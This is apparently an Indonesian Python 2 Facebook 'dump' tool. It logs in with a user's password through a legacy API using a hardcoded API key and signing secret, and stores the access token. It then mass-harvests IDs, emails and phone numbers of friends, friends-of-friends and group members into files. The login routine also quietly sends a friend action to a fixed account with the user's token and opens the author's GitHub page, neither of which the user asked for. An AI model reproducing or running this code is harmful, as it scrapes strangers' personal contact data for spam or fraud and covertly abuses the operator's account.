#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
#By BlackList
try:
    import mechanize
except ImportError:
    os.system("pip2 install mechanize")
try:
    import requests
except ImportError:
    os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#-Keluar-#
def keluar():
    print "\033[1;91m[!] Exit"
    os.sys.exit()
    
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
    
#-Animasi-#
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.1)
        
#####LOGIN######
def login():
	os.system('reset')
	try:
		toket = open('login.txt','r')
		dump() 
	except (KeyError,IOError):
		os.system('reset')
		print logo
		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://github.com/CrazyLolz100')
				login()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			print("\n\033[1;92m[#] Harap Login Ulang !")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
##### TOKEN #####
def tokenz():
	os.system('reset')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
        
##### LOGO #####
logo = """\033[32m| | | |  / \  |  \/  |  / \   __| | _____   __
\033[97m| |_| | / _ \ \033[33m| |\/| | \033[33m/ _ \ \033[97m/ _` |/ _ \ \ / /
\033[97m|  _  |/ ___ \\\033[33m| |  | |\033[33m/ ___ \ \033[97m(_| |  __/\ V / 
\033[31m|_| |_/_/   \_\_|  |_/_/   \_\__,_|\___| \_/
\033[33mMake by Hama dev
Telegram//@xxxHAMAxxx
TelegramChannel//@HAMADEVCHANNEL"""

# titik #
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
    os.system('reset')
    masuk()
        
##### DUMP #####
def dump():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        login()
        time.sleep(1)
    os.system('reset')
    print logo
    print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Get ID friend"
    print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Get ID friend from friend"
    print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Get ID Search"
    print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Get group member ID"
    print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Get group member email"
    print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Get group member phone number"
    print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Get email friend"
    print "\033[1;97m║--\033[1;91m> \033[1;92m8.\033[1;97m Get email friend from friend"
    print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m Get a friend's phone number"
    print "\033[1;97m║--\033[1;91m> \033[1;92m10.\033[1;97m Get a friend's phone number from friend"
    print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
    print "║"
    dump_pilih()
#-----pilih
def dump_pilih():
    cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
    if cuih =="":
        print "\033[1;91m[!] Wrong input"
        dump_pilih()
    elif cuih =="1":
        id_teman()
    elif cuih =="2":
        idfrom_teman()
    elif cuih =="3":
        os.system('reset')
        print "\033[1;91mSegera"
        keluar()
    elif cuih =="4":
        id_member_grup()
    elif cuih =="5":
        em_member_grup()
    elif cuih =="6":
        no_member_grup()
    elif cuih =="7":
        email()
    elif cuih =="8":
        emailfrom_teman()
    elif cuih =="9":
        nomor_hp()
    elif cuih =="10":
        hpfrom_teman()
    elif cuih =="0":
        menu()
    else:
        print "\033[1;91m[!] Wrong input"
        dump_pilih()
        
##### ID TEMAN #####
def id_teman():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z=json.loads(r.text)
        jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/id_teman.txt','w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print ("\r\033[1;97m[ \033[1;92m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
        bz.close()
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/id_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()

##### ID FROM TEMAN #####
def idfrom_teman():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
        except KeyError:
            print"\033[1;91m[!] Friend not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
        z=json.loads(r.text)
        jalan('\033[1;91m[✺] \033[1;92mGet all friend id from friend \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/id_teman_from_teman.txt','w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
        bz.close()
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/id_teman_from_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()

##### ID FROM MEMBER GRUP #####
def id_member_grup():
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
        try:
            r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
            asw=json.loads(r.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
        except KeyError:
            print"\033[1;91m[!] Group not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/member_grup.txt','w')
        re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
        s=json.loads(re.text)
        for a in s['data']:
            idmem.append(a['id'])
            bz.write(a['id'] + '\n')
            print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
        bz.close()
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/member_grup.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()
        
##### EMAIL FROM GRUP #####
def em_member_grup():
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
        try:
            r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
            asw=json.loads(r.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
        except KeyError:
            print"\033[1;91m[!] Group not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/em_member_grup.txt','w')
        re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
        s=json.loads(re.text)
        for a in s['data']:
            x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                emmem.append(z['email'])
                bz.write(z['email'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/em_member_grup.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()
        
##### NOMER FROM GRUP #####
def no_member_grup():
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
        try:
            r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
            asw=json.loads(r.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
        except KeyError:
            print"\033[1;91m[!] Group not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        jalan('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/no_member_grup.txt','w')
        re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
        s=json.loads(re.text)
        for a in s['data']:
            x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                nomem.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(nomem))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/no_member_grup.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()
        
##### EMAIL #####
def email():
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
        a = json.loads(r.text)
        jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/email_teman.txt','w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                em.append(z['email'])
                bz.write(z['email'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/email_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()

##### EMAIL FROM TEMAN #####
def emailfrom_teman():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
        except KeyError:
            print"\033[1;91m[!] Friend not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
        a = json.loads(r.text)
        jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/em_teman_from_teman.txt','w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                emfromteman.append(z['email'])
                bz.write(z['email'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/em_teman_from_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()
        
##### NOMER #####
def nomor_hp():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        jalan('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
        print 42*"\033[1;97m═"
        url= "https://graph.facebook.com/me/friends?access_token="+toket
        r =requests.get(url)
        z=json.loads(r.text)
        bz = open('out/nomer_teman.txt','w')
        for n in z["data"]:
            x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                hp.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/nomer_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()

##### NOMER FROM TEMAN #####
def hpfrom_teman():
    os.system('reset')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\033[1;91m[!] Token not found"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        os.mkdir('out')
    except OSError:
        pass
    try:
        os.system('reset')
        print logo
        idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
        except KeyError:
            print"\033[1;91m[!] Friend not found"
            raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            dump()
        r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
        a = json.loads(r.text)
        jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
        print 42*"\033[1;97m═"
        bz = open('out/no_teman_from_teman.txt','w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                hpfromteman.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
            except KeyError:
                pass
        bz.close()
        print 42*"\033[1;97m═"
        print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
        print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
        done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
        os.rename('out/no_teman_from_teman.txt','out/'+done)
        print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except IOError:
        print"\033[1;91m[!] Error creating file"
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except (KeyboardInterrupt,EOFError):
        print("\033[1;91m[!] Stopped")
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except KeyError:
        print('\033[1;91m[!] Error')
        raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
        dump()
    except requests.exceptions.ConnectionError:
        print"\033[1;91m[✖] No connection"
        keluar()
        
        
        
if __name__ == '__main__':
        login()

